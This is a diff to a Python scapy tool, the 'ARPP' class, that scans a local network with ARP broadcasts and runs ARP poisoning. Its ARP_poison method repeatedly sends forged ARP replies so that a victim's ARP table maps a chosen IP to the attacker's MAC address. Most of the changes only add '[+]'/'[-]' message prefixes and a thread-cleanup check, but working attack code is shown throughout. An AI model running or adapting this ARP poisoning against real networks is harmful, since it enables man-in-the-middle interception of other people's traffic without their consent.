@@ -173,11 +173,11 @@ class ARPP(object):
                 self.SELECTED_INTERFACE=iflist[answer]
                 print("selected {}".format(self.SELECTED_INTERFACE))
             else:
-                print("Interface does not exist\n")
+                print("[-] Interface does not exist\n")
         elif answer in iflist:
             self.SELECTED_INTERFACE = answer
         else:
-            print("Interface does not exist\n")
+            print("[-] Interface does not exist\n")
     
     def select_interface_windows(self):
         """The main issue is that for windows the selected interface has to be of type scapy.arch.windows.NetworkInterface
@@ -203,8 +203,12 @@ class ARPP(object):
                 selected_interface_dict = if_list[answer]
                 selected_interface_name = selected_interface_dict['name']
                 self.SELECTED_INTERFACE = IFACES.dev_from_name( selected_interface_name )
-                print("selected {}".format(selected_interface_name))
+                print("[+] selected {}".format(selected_interface_name))
                 #get_windows_if_list()[4]['name']
+            else:
+                print("[-] Interface does not exist\n")
+        else:
+            print("[-] Interface does not exist\n")
         
         
     def get_network_users_ARPSCAN(self):
@@ -215,16 +219,15 @@ class ARPP(object):
         
         ip_range = self.get_ip_range()
         request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range) #dst="ff:ff:..." means all devices on the network will receive this packet.
-        print("Finding devices connected to network, please wait...")
+        print("[+] Finding devices connected to network, please wait...")
         
-        print("Selected Interface: {}".format(self.SELECTED_INTERFACE))
-            
+        print("[+] Selected Interface: {}".format(self.SELECTED_INTERFACE))
         network_devices = srp(request, timeout=10, verbose=1, iface=self.SELECTED_INTERFACE)[0] # sr is send receive command, srp for L2 packet, add 1 at the end for waiting for 1 packet only.
         for i, user in enumerate(network_devices, start=0):
             print("{}          {}".format(user[1].psrc, user[1].hwsrc))
         
         if network_devices == []:
-            print("No network devices found\n")
+            print("[-] No network devices found\n")
         
     def ARP_poison(self, ipVictim = "", ipToSpoof = ""):
         """
@@ -249,14 +252,14 @@ class ARPP(object):
         
         while not self._is_valid_ip(ipToSpoof):
             try:
-                print("The ip to spoof is the ip you want your mac address to be associated to in the victim's arp table")
+                print("[i] The ip to spoof is the ip you want your mac address to be associated to in the victim's arp table")
                 ipToSpoof = str(input("ip to spoof>>"))
             except SyntaxError:
                 pass
         
         macVictim = self._get_mac_from_ip(ipVictim) # fix bug where error given if ip is not online on network
         if macVictim is None:
-            print("Victims MAC address could not be found")
+            print("[-] Victims MAC address could not be found, victim is possibly no longer connected to network.")
             return
         macAttacker = self._get_my_mac()
                 
@@ -268,7 +271,7 @@ class ARPP(object):
         pkt[ARP].hwdst = macVictim
         pkt[ARP].pdst  = ipVictim
         
-        print("ARP spoofing {} -> {} started".format(ipToSpoof, ipVictim))
+        print("[+] ARP poisoning {} -> {} started".format(ipToSpoof, ipVictim))
         e = threading.Event()
         def rec(event):
             while True:
@@ -277,7 +280,7 @@ class ARPP(object):
                 sendp( pkt, iface=self.SELECTED_INTERFACE, verbose=False )
                 sleep(2)
         
-        T = threading.Thread(target=rec, name="Spoofing {} -> {}".format(ipToSpoof, ipVictim), args=(e,))
+        T = threading.Thread(target=rec, name="ARP poisoning {} -> {}".format(ipToSpoof, ipVictim), args=(e,))
         
         self.THREADED_TASKS.append(T)
         self.EVENTS.append(e)
@@ -318,13 +321,14 @@ class ARPP(object):
             print(tb)
         
     def end_all_threads(self):
-        print("\nclosing threads... please wait")
-        for e in self.EVENTS:
-                e.set()
-        del self.EVENTS
-        del self.THREADED_TASKS
-        self.EVENTS = []
-        self.THREADED_TASKS = []
+        if self.THREADED_TASKS != []:
+            print("\n[+] closing threads... please wait")
+            for e in self.EVENTS:
+                    e.set()
+            del self.EVENTS
+            del self.THREADED_TASKS
+            self.EVENTS = []
+            self.THREADED_TASKS = []
         
 
     def parse_command(self, command):
@@ -339,7 +343,7 @@ class ARPP(object):
                     self.end_all_threads()
                 task()
             except IndexError as e:
-                print("Command not found\n")
+                print("[-] Command not found\n")
                 tb = traceback.format_exc()
                 print(tb)
         else:
@@ -349,7 +353,7 @@ class ARPP(object):
                     self.end_all_threads()
                 task()
             except KeyError:
-                print("Command not found\n")
+                print("[-] Command not found\n")
                 
                 #tb = traceback.format_exc()
                 #print(tb)
